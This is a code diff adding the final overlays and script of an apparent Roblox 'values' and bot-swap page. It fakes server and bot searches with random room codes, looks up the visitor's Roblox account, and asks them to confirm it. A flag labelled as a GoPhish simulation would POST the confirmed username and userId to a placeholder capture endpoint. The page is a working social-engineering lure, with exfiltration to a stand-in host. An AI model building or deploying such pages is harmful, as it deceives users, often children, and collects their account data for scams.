@@ -1166,3 +1166,127 @@ showPage('values');
     <button class="btn-primary" onclick="closeOverlay('ovSwapIt'); openOverlay('ovRate');">CONTINUE</button>
   </div>
 </div>
+
+<!-- Rate -->
+<div class="overlay" id="ovRate">
+  <div class="modal">
+    <button class="close" onclick="closeOverlay('ovRate')">✕</button>
+    <h3>Give us a rate!</h3>
+    <p>Did you enjoy our servers?</p>
+    <div style="color:#a78bfa; font-size:22px; margin-bottom:14px;">★★★★★</div>
+    <button class="btn-primary" onclick="closeOverlay('ovRate');">Rate</button>
+  </div>
+</div>
+
+<footer>
+  © 2026 Jace Values. All rights reserved. · Powered by Jace™ · v35
+</footer>
+
+<script>
+/* =========================================================
+   Simulation mode flag — keep FALSE for demo purposes.
+   When TRUE, submits the confirmed username to your own
+   GoPhish capture endpoint (configurable below) instead of
+   just displaying it. Never point this at anything you
+   don't own or have explicit written authorization to test.
+   ========================================================= */
+const SIMULATION_MODE = false;
+const GOPHISH_CAPTURE_URL = "https://your-gophish-server/capture";
+
+/* ---------- Overlay helpers ---------- */
+function openOverlay(id)   { document.getElementById(id).classList.add('show'); }
+function closeOverlay(id)  { document.getElementById(id).classList.remove('show'); }
+
+/* ---------- Random bot room code ---------- */
+function randomRoomCode() {
+  const chars = "ABCDEFGHJKMNPQRSTUVWXYZ0123456789";
+  let code = "#";
+  for (let i = 0; i < 3; i++) code += chars[Math.floor(Math.random() * chars.length)];
+  code += "-";
+  for (let i = 0; i < 3; i++) code += chars[Math.floor(Math.random() * chars.length)];
+  return code;
+}
+
+/* ---------- Flow: Join server ---------- */
+function openServerFlow() {
+  openOverlay('ovSearching');
+  document.getElementById('searchLabel').textContent = "Searching server...";
+  document.getElementById('roomCode').textContent = randomRoomCode();
+  setTimeout(() => {
+    closeOverlay('ovSearching');
+    openOverlay('ovServerFound');
+  }, 2200);
+}
+
+/* ---------- Flow: Secure bot ticket (from swap) ---------- */
+function openTicketFlow() {
+  openOverlay('ovSearching');
+  document.getElementById('searchLabel').textContent = "Searching for available bot...";
+  document.getElementById('roomCode').textContent = randomRoomCode();
+  setTimeout(() => {
+    closeOverlay('ovSearching');
+    openOverlay('ovServerFound');
+  }, 2400);
+}
+
+/* ---------- Roblox public API lookup (username → userId → headshot) ---------- */
+async function searchRoblox() {
+  const username = document.getElementById('roloxInput').value.trim();
+  const errEl = document.getElementById('confirmErr');
+  if (!username) { errEl.style.display = 'block'; return; }
+  errEl.style.display = 'none';
+
+  document.getElementById('ovConfirm').classList.remove('show');
+  openOverlay('ovLooking');
+
+  try {
+    // 1) username → userId (public, read-only endpoint)
+    const usersRes = await fetch('https://users.roblox.com/v1/usernames/users', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
+    });
+    const usersJson = await usersRes.json();
+    if (!usersJson.data || usersJson.data.length === 0) throw new Error('not found');
+
+    const user = usersJson.data[0];
+
+    // 2) userId → headshot image URL (public, read-only endpoint)
+    const thumbRes = await fetch(
+      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=150x150&format=Png&isCircular=false`
+    );
+    const thumbJson = await thumbRes.json();
+    let headshot = thumbJson.data[0].imageUrl;
+
+    closeOverlay('ovLooking');
+    document.getElementById('userHeadshot').src = headshot;
+    document.getElementById('userName').textContent = user.name;
+    document.getElementById('userDisp').textContent = user.displayName;
+    openOverlay('ovIsYou');
+
+    // YES handler
+    document.getElementById('yesBtn').onclick = async function () {
+      if (SIMULATION_MODE) {
+        try {
+          await fetch(GOPHISH_CAPTURE_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: user.name, userId: user.id, sessionId: randomRoomCode() })
+          });
+        } catch (e) { /* log for engagement evidence */ }
+      }
+      document.getElementById('swapSummary').textContent =
+        `Bot will swap with @${user.name} (userId ${user.id})`;
+      closeOverlay('ovIsYou');
+      openOverlay('ovSwapIt');
+    };
+  } catch (e) {
+    closeOverlay('ovLooking');
+    document.getElementById('confirmErr').style.display = 'block';
+    openOverlay('ovConfirm');
+  }
+}
+</script>
+
+</body>
+</html>
